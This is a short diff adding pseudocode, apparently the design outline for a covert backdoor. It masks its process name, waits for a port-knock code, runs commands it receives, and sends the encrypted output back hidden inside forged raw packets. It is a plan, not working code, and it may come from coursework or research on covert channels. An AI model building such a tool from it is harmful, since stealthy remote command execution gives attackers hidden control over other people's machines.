@@ -1,0 +1,17 @@
+main
+	find best disguise
+		disguise name
+
+	begin listening
+		wait for knockcode
+			while getting commands
+				execute command
+				spawn result thread, pipe in results
+
+result thread
+	open raw socket
+	get results
+	forge packets
+		encrypt results
+		embed encrypted data in packet
+		send to client
